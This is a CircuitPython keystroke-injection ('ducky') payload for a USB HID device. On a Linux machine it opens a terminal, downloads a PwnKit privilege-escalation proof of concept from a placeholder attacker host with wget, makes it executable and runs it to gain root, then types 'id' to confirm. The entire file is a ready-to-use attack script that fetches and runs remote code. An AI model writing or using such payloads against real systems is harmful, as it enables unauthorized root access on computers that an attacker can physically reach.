import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_hid.keycode import Keycode
from time import sleep


kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# ducky payload starts here

# simple script to execute any command as root on linux using the (pwnkit) poc
# ---------------------------------------------------------------------------
sleep(4.0)
kbd.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
sleep(0.2)
layout.write(r'cd /tmp')
sleep(0.15)
kbd.send(Keycode.ENTER)
sleep(0.1)
layout.write(r'wget http://YOUR_IP/pwnkit_poc')
sleep(1.0)
kbd.send(Keycode.ENTER)
sleep(1.5)
layout.write(r'chmod +x pwnkit_poc')
sleep(0.15)
kbd.send(Keycode.ENTER)
sleep(0.1)
layout.write(r'./pwnkit_poc')
sleep(0.15)
kbd.send(Keycode.ENTER)
sleep(0.2)
# root access starts here 
# ----------------------------
layout.write(r'id')
sleep(0.05)
kbd.send(Keycode.ENTER)
